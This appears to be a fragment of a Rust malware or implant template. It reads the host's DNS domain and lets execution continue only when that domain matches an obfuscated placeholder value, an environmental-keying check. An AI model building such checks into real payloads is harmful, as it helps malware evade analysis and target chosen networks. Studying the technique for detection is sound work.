fn get_domain_name() -> Option<String> {
    const COMPUTER_NAME_DNS_DOMAIN: i32 = 3;
    let mut size: u32 = 256;
    let mut buffer: Vec<u16> = vec![0; size as usize];

    let success = unsafe {
        rp_get_computer_name_ex(COMPUTER_NAME_DNS_DOMAIN, buffer.as_mut_ptr(), &mut size)
    };
    if success == 0 || size == 0 {
        return None;
    }

    let domain_name = String::from_utf16_lossy(&buffer[..size as usize])
        .trim_end_matches('\0')
        .to_string();

    if domain_name.is_empty() {
        return None;
    }
    Some(domain_name)
}
fn sandbox() -> bool {
    match get_domain_name() {
        Some(domain) => domain.as_str().eq_ignore_ascii_case({{OBF_SANDBOX_DOMAIN}}.as_str()),
        None => false,
    }
}
if !sandbox() {
    return;
}
